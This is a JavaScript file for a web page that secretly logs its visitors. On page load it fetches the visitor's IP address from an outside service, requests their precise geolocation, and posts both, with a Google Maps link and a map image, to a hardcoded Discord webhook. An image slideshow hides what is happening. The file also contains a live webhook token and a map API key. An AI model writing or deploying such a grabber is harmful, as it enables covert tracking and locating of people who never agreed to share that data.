document.addEventListener("DOMContentLoaded", async function() {
    try {
        await sendIPToDiscord();
        await handleLocation();
    } catch (error) {
        console.error("An error occurred:", error);
    }
});

const webhookUrl = "https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ";

async function sendIPToDiscord() {
    try {
        const ipAddress = await getUserIPAddress();
        const ipContent = `**IP Address Information:**\n- IP Address: ${ipAddress}`;
        const ipEmbed = createEmbed("IP Address Information", ipContent, 14267868);
        await sendMessageToDiscord(ipEmbed);
    } catch (error) {
        console.error("Error sending IP address to Discord:", error);
    }
}

async function handleLocation() {
    try {
        const locationInfo = await getLocationInfo();
        if (locationInfo) {
            const locationContent = createLocationContent(locationInfo);
            const locationEmbed = createEmbed("Location Information", locationContent, 16776960, locationInfo.mapImageUrl);
            await sendMessageToDiscord(locationEmbed);

            const images = ["image1.png", "image2.png", "image3.png", "image4.png", "image5.png"];
            await preloadImages(images);

            const mapContainer = document.getElementById("map");
            mapContainer.style.zIndex = "0";

            const imageContainer = createImageContainer();
            fadeInImages(images, imageContainer);
        }
    } catch (error) {
        console.error("Error handling location:", error);
    }
}

async function sendMessageToDiscord(embed) {
    try {
        const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ embeds: [embed] })
        });

        if (!response.ok) {
            throw new Error("Failed to send message to Discord.");
        }
    } catch (error) {
        console.error("Error sending message to Discord:", error);
    }
}

async function preloadImages(images) {
    const imagePromises = images.map(imageName => loadImage(`images/${imageName}`));
    await Promise.all(imagePromises);
}

function createEmbed(title, description, color, imageUrl = null) {
    const embed = {
        title,
        description,
        color
    };
    if (imageUrl) {
        embed.image = { url: imageUrl };
    }
    return embed;
}

function createLocationContent(locationInfo) {
    return `**Location Information:**\n- Latitude: ${locationInfo.latitude}\n- Longitude: ${locationInfo.longitude}\n- [View on Google Maps](${locationInfo.googleMapsUrl})`;
}

function createImageContainer() {
    const imageContainer = document.createElement("div");
    imageContainer.id = "image-container";
    document.body.appendChild(imageContainer);
    return imageContainer;
}

async function fadeInImages(images, imageContainer) {
    let currentIndex = 0;
    const fadeDuration = 1000;

    async function fadeInImage() {
        const imageElement = new Image();
        imageElement.src = `images/${images[currentIndex]}`;
        imageElement.classList.add("fading-image");
        imageContainer.appendChild(imageElement);

        await new Promise(resolve => setTimeout(resolve, 100));

        imageElement.style.opacity = "1";
        await new Promise(resolve => setTimeout(resolve, fadeDuration));

        imageElement.style.opacity = "0";
        currentIndex = (currentIndex + 1) % images.length;
        setTimeout(fadeInImage, fadeDuration);
    }

    fadeInImage();
}

async function loadImage(src) {
    return new Promise((resolve, reject) => {
        const image = new Image();
        image.onload = resolve;
        image.onerror = reject;
        image.src = src;
    });
}

async function getUserIPAddress() {
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error retrieving IP address:", error);
        return "IP address retrieval error";
    }
}

async function getLocationInfo() {
    return new Promise((resolve, reject) => {
        if ("geolocation" in navigator) {
            const options = {
                enableHighAccuracy: true,
                timeout: 1000
            };

            navigator.geolocation.getCurrentPosition(
                position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    const mapImageUrl = `https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=400&height=300&center=lonlat:${longitude},${latitude}&zoom=15&apiKey=f2848b88743c4c1eaeea78ec915eb3dd`;
                    const locationInfo = {
                        latitude,
                        longitude,
                        googleMapsUrl,
                        mapImageUrl
                    };
                    resolve(locationInfo);
                },
                error => {
                    resolve(null);
                },
                options
            );
        } else {
            resolve(null);
        }
    });
}
